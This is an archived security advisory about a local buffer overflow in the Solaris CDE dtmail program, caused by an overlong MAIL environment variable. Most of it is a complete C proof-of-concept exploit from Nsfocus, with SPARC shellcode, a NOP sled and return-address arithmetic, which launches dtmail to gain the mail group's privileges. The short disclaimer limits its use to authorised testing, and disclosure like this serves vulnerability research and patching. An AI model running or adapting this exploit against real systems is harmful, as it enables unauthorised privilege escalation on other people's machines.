source: http://www.securityfocus.com/bid/3081/info

dtmail is an application included with the Common Desktop Environment, one of the X Window Managers included with Solaris.

A buffer overflow in dtmail makes it possible for a local user to gain elevated privileges. Due to improper bounds checking, it is possible to cause a buffer overflow in dtmail by filling the MAIL environment variable with 2000 or more characters. This results in the overwriting of stack variables, including the return address, and can allow a local user to gain an effective GID of mail.

/*
 *  sol_sparc_dtmail_MAIL_ex.c - Proof of Concept Code for dtmail $MAIL overflow bug.
 *
 *  Copyright (c) 2001 - Nsfocus.com
 *
 *  It will run "/bin/id" if the exploit succeed.
 *  Tested in Solaris 2.6/7 (SPARC).
 *
 *  DISCLAIMS:
 *  This  is a proof of concept code.  This code is for test purpose 
 *  only and should not be run against any host without permission from 
 *  the system administrator.
 * 
 *  NSFOCUS Security Team <security@nsfocus.com>
 *  http://www.nsfocus.com
 */
 
#include <stdio.h>
#include <stdlib.h>
#include <sys/systeminfo.h>
#include <pwd.h>

struct passwd  *pwd;;

#define SP      0xffbefffc      /* default bottom stack address (Solaris 7/8) */

#define DISPENV "DISPLAY=127.0.0.1:0.0"

#define VULPROG "/usr/dt/bin/dtmail"
#define NOP     0xaa1d4015      /* "xor %l5, %l5, %l5" */


char            shellcode[] =   
"\x90\x08\x3f\xff\x90\x02\x20\x06\x82\x10\x20\x88\x91\xd0\x20\x08" 

"\x90\x08\x3f\xff\x90\x02\x20\x06\x82\x10\x20\x2e\x91\xd0\x20\x08" 
"\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xda\x59\x90\x0b\x80\x0e"
"\x92\x03\xa0\x0c\x94\x1a\x80\x0a\x9c\x03\xa0\x14\xec\x3b\xbf\xec"
"\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b"
"\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08";

/* get current stack point address */
long
get_sp(void)
{
        __asm__("mov %sp,%i0");
}

long
get_shelladdr(long sp_addr, char **arg, char **env, long off)
{
        long            retaddr;
        int             i;
        char            plat[256];
        char            pad = 0, pad1 = 0, pad2;
        int             env_len, arg_len, len;

        while (1) {
                /* calculate the length of "VULPROG" + argv[] */
                for (i = 0, arg_len = 0; arg[i] != NULL; i++) {
                        arg_len += strlen(arg[i]) + 1;
                 }

                /* calculate the pad nummber . */
                pad = 3 - arg_len % 4;

                memset(env[0], 'A', pad);
                env[0][pad] = '\0';

                memset(env[2], 'A', pad1);
                env[2][pad1] = '\0';

                /* get environ length */
                for (i = 0, env_len = 0; env[i] != NULL; i++) {
                        env_len += strlen(env[i]) + 1;
                 }

                /* get platform info  */
                sysinfo(SI_PLATFORM, plat, 256);

                len = arg_len + env_len + strlen(plat) + 1 + strlen(VULPROG) + 1;

                pad2 = 4 - len % 4;

                /* get the exact shellcode address */
                retaddr = sp_addr - pad2        /* the trailing zero number */
                        - strlen(VULPROG) - 1
                        - strlen(plat) - 1;

                for (i--; i > 0; i--)
                        retaddr -= strlen(env[i]) + 1;

                if (!((retaddr + off) & 0xff)) {
                        pad1 += 8;
                        continue;
                } else if ((retaddr + off) % 8) {
                        pad1 += 4;
                        continue;
                } else
                        break;
        }
        return retaddr;

} /* End of get_shelladdr */


int
main(int argc, char **argv)
{
        char            buf[4096], home[128], display[256];
        char            eggbuf[2048];
        long            retaddr, sp_addr = SP;
        char           *arg[24], *env[24], *cwd, *charptr;
        char            padding[64], padding1[64];
        unsigned int   *ptr;
        char           *disp;
        char            ev1[] = "MAIL=";
        long            ev1_len, i, align;
        long            overbuflen = 2048;

        if (argc > 1)
                snprintf(display, sizeof(display) - 1, "DISPLAY=%s", argv[1]);
        else {
                disp = getenv("DISPLAY");
                if (disp)
                        snprintf(display, sizeof(display) - 1, "DISPLAY=%s", disp);
                else
                        strncpy(display, DISPENV, sizeof(display) - 1);
        }

        pwd = getpwuid((uid_t) getuid());
        snprintf(home, 127, "HOME=%s", strdup(pwd->pw_dir));

        arg[0] = VULPROG;
        arg[1] = NULL;

        cwd = getcwd((char *) NULL, 256);
        overbuflen = overbuflen - (strlen(cwd) + strlen("/"));
        ev1_len = strlen(ev1);
        bzero(buf, sizeof(buf));
        memcpy(buf, ev1, ev1_len);
        memset(buf + ev1_len, 'A', overbuflen);

        bzero(eggbuf, sizeof(eggbuf));
        ptr = (unsigned int *) eggbuf;
        for (i = 0; i < sizeof(eggbuf) - strlen(shellcode); i += 4)
                *(ptr + i / 4) = NOP;
        memcpy(eggbuf + i - 4, shellcode, strlen(shellcode));

        env[0] = padding;       /* put padding buffer in env */
        env[1] = eggbuf;        /* put shellcode in env */
        env[2] = padding1;      /* put padding1 buffer in env */
        env[3] = buf;           /* put overflow environ */
        env[4] = display;       /* put display environ */
        env[5] = home;          /* put home environ */
        env[6] = NULL;          /* end of env */

        /* get stack bottom address */
        if (((unsigned char) (get_sp() >> 24)) == 0xef) {       /* Solaris 2.6 */
                sp_addr = SP - 0x0fbf0000;
        }
        retaddr = get_shelladdr(sp_addr, arg, env, -8);

        retaddr -= 8;
        printf("Using  return address = 0x%x (shelladdrr - 8)\n", retaddr);
        printf("Click Local in your X window\n\n");

        charptr = (char *) &retaddr;
        align = 4 - ((strlen(cwd) + strlen("/")) % 4);
        for (i = 0; i < overbuflen - align; i++)
                buf[ev1_len + align + i] = *(charptr + i % 4);


        execve(VULPROG, arg, env);
        perror("execle");
}                               /* End of main */